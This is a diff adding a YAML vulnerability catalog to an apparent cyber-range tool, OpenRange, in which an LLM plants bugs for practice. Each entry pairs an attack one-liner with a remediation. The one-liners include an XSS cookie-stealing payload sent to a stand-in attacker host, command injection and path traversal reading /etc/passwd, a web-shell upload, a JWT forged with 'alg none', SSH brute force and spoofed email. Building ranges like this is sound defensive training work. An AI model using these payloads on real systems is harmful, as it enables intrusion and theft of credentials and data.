@@ -1,0 +1,188 @@
+# OpenRange Vulnerability Catalog
+# Registry of plantable vulnerability classes organized by realism layer.
+# The Builder LLM selects from bug_families declared in the manifest,
+# using these entries for golden-path snippets and remediation templates.
+
+# ─── Application Layer ────────────────────────────────────────────────
+
+sqli:
+  layer: application
+  description: SQL injection via unsanitized user input in query parameters
+  applicable_services: [php, python-flask, python-django, nodejs, mysql, postgres]
+  difficulty: low
+  golden_path_snippet: "sqlmap -u 'http://{host}/search?q=test' --dbs"
+  remediation_template: "Use parameterized queries / prepared statements"
+
+xss:
+  layer: application
+  description: Cross-site scripting (stored or reflected) via unescaped output
+  applicable_services: [php, python-flask, nodejs, nginx]
+  difficulty: medium
+  golden_path_snippet: "curl 'http://{host}/comment' -d 'body=<script>document.location=\"http://attacker/steal?\"+document.cookie</script>'"
+  remediation_template: "HTML-encode all user-controlled output; set Content-Security-Policy"
+
+idor:
+  layer: application
+  description: Insecure direct object reference — sequential IDs without authorization
+  applicable_services: [php, python-flask, nodejs]
+  difficulty: medium
+  golden_path_snippet: "for i in $(seq 1 20); do curl -s http://{host}/api/users/$i; done"
+  remediation_template: "Check session user owns the requested resource before returning data"
+
+command_injection:
+  layer: application
+  description: User input passed to shell execution (os.system, exec, backticks)
+  applicable_services: [php, python-flask, nodejs]
+  difficulty: low
+  golden_path_snippet: "curl 'http://{host}/ping?host=127.0.0.1;cat+/etc/passwd'"
+  remediation_template: "Use subprocess with shell=False and explicit argument lists"
+
+ssrf:
+  layer: application
+  description: Server-side request forgery — user-controlled URL fetched by server
+  applicable_services: [php, python-flask, nodejs, nginx]
+  difficulty: high
+  golden_path_snippet: "curl 'http://{host}/fetch?url=http://db:3306/'"
+  remediation_template: "Validate and allowlist target URLs; block internal ranges"
+
+ssti:
+  layer: application
+  description: Server-side template injection via user input in template rendering
+  applicable_services: [python-flask, python-django, nodejs]
+  difficulty: high
+  golden_path_snippet: "curl 'http://{host}/profile?name={{config.items()}}'"
+  remediation_template: "Never pass user input as template source; use sandboxed rendering"
+
+lfi:
+  layer: application
+  description: Local file inclusion via unsanitized file path parameter
+  applicable_services: [php, python-flask, nginx]
+  difficulty: medium
+  golden_path_snippet: "curl 'http://{host}/view?file=../../../../etc/passwd'"
+  remediation_template: "Validate file paths against an allowlist; use realpath() checks"
+
+rce:
+  layer: application
+  description: Remote code execution via deserialization, eval, or upload bypass
+  applicable_services: [php, python-flask, nodejs]
+  difficulty: high
+  golden_path_snippet: "curl -F 'file=@shell.php' http://{host}/upload && curl http://{host}/uploads/shell.php?cmd=id"
+  remediation_template: "Validate file types server-side; never execute uploaded content"
+
+# ─── Infrastructure Layer ─────────────────────────────────────────────
+
+config_drift:
+  layer: infrastructure
+  description: Service misconfiguration introduced by recent changes or neglect
+  applicable_services: [nginx, apache, mysql, postgres, sshd, smb, postfix]
+  difficulty: medium
+  golden_path_snippet: "curl -s http://{host}:8080/admin/ # unauth admin panel from tech debt"
+  remediation_template: "Review and harden service configs; remove debug/admin endpoints"
+
+misconfig:
+  layer: infrastructure
+  description: Default or insecure service configuration (directory listing, debug mode)
+  applicable_services: [nginx, apache, mysql, sshd, smb, ldap, postfix]
+  difficulty: low
+  golden_path_snippet: "curl http://{host}/ # directory listing enabled"
+  remediation_template: "Disable directory listing, debug mode, and default pages"
+
+smb_misconfig:
+  layer: infrastructure
+  description: SMB share with overly permissive access or guest authentication
+  applicable_services: [smb, samba]
+  difficulty: medium
+  golden_path_snippet: "smbclient -L //{host}/ -N && smbclient //{host}/shared -N -c 'ls'"
+  remediation_template: "Require authentication for all shares; restrict share permissions"
+
+mail_misconfig:
+  layer: infrastructure
+  description: Mail server without SPF/DKIM/DMARC allowing spoofed emails
+  applicable_services: [postfix, dovecot, smtp]
+  difficulty: medium
+  golden_path_snippet: "swaks --to victim@{domain} --from ceo@{domain} --server {host}"
+  remediation_template: "Configure SPF, DKIM, and DMARC records; enable relay restrictions"
+
+missing_patches:
+  layer: infrastructure
+  description: Known CVE in outdated software version (EOL or unpatched)
+  applicable_services: [php, mysql, nginx, apache, openssh, samba]
+  difficulty: medium
+  golden_path_snippet: "searchsploit {service} {version}"
+  remediation_template: "Update to patched version; apply vendor security patches"
+
+insecure_protocol:
+  layer: infrastructure
+  description: Cleartext protocol (FTP, Telnet, HTTP) where encrypted alternative exists
+  applicable_services: [ftp, telnet, http, smtp, ldap]
+  difficulty: low
+  golden_path_snippet: "tcpdump -i eth0 -A port 21 # capture cleartext FTP creds"
+  remediation_template: "Replace with encrypted alternatives (SFTP, SSH, HTTPS, LDAPS)"
+
+# ─── Identity Layer ───────────────────────────────────────────────────
+
+weak_creds:
+  layer: identity
+  description: Default, common, or easily guessable passwords on accounts
+  applicable_services: [sshd, mysql, postgres, ldap, smb, ftp, web-login]
+  difficulty: low
+  golden_path_snippet: "hydra -l admin -P /usr/share/wordlists/rockyou.txt {host} ssh"
+  remediation_template: "Enforce password complexity; rotate default credentials"
+
+broken_auth:
+  layer: identity
+  description: Authentication bypass via JWT manipulation, session fixation, or logic flaw
+  applicable_services: [php, python-flask, nodejs, nginx]
+  difficulty: high
+  golden_path_snippet: "# Decode JWT, change alg to none, re-encode\npython3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '', algorithm='none'))\""
+  remediation_template: "Validate JWT algorithm server-side; use strong signing keys"
+
+credential_reuse:
+  layer: identity
+  description: Same password used across multiple services or accounts
+  applicable_services: [sshd, mysql, smb, ldap, web-login]
+  difficulty: low
+  golden_path_snippet: "# Found password 'Welcome2024!' on web login; try SSH\nssh {user}@{host}  # same password works"
+  remediation_template: "Unique passwords per service; implement credential rotation policy"
+
+orphaned_access:
+  layer: identity
+  description: Active account for departed employee or decommissioned service
+  applicable_services: [sshd, ldap, mysql, smb]
+  difficulty: medium
+  golden_path_snippet: "ldapsearch -x -h {host} -b 'dc=corp,dc=local' '(objectClass=person)' # find stale accounts"
+  remediation_template: "Implement offboarding checklist; audit accounts quarterly"
+
+overpermission:
+  layer: identity
+  description: Account with privileges beyond its role (DBA privs on app service account)
+  applicable_services: [mysql, postgres, ldap, smb, sshd]
+  difficulty: medium
+  golden_path_snippet: "mysql -u svc_app -p'apppass' -e 'SHOW GRANTS'  # has GRANT ALL"
+  remediation_template: "Apply least privilege; restrict service accounts to required operations"
+
+# ─── Process Layer ────────────────────────────────────────────────────
+
+data_exposure:
+  layer: process
+  description: Sensitive data accessible without proper authorization controls
+  applicable_services: [smb, mysql, web-app, ftp]
+  difficulty: medium
+  golden_path_snippet: "smbclient //{host}/hr_docs -U guest -N -c 'get salary_report.xlsx'"
+  remediation_template: "Classify data assets; restrict access by role and classification"
+
+missing_authz:
+  layer: process
+  description: Business operation lacks authorization check (API endpoint, admin function)
+  applicable_services: [php, python-flask, nodejs]
+  difficulty: medium
+  golden_path_snippet: "curl -X POST http://{host}/api/admin/users -d '{\"role\":\"admin\"}' # no auth required"
+  remediation_template: "Add role-based access control to all sensitive endpoints"
+
+insecure_backup:
+  layer: process
+  description: Backup files accessible or containing credentials in cleartext
+  applicable_services: [smb, ftp, web-app, mysql]
+  difficulty: low
+  golden_path_snippet: "curl http://{host}/backup/db_dump.sql # exposed backup with creds"
+  remediation_template: "Encrypt backups; restrict backup storage access; remove web-accessible backups"
